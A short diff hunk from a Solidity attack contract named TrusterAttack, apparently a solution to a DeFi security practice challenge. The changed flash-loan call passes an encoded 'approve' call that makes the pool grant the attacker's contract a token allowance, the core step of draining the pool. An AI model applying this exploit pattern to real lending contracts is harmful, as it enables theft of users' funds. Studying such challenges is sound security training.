@@ -34,7 +34,7 @@ contract TrusterAttack {
         IPoolFunc(pool).flashLoan(
             0,
             address(this),
-            token,
+            tokenAddress,
             abi.encodeWithSignature(
                 "approve(address, uint256)",
                 address(this),
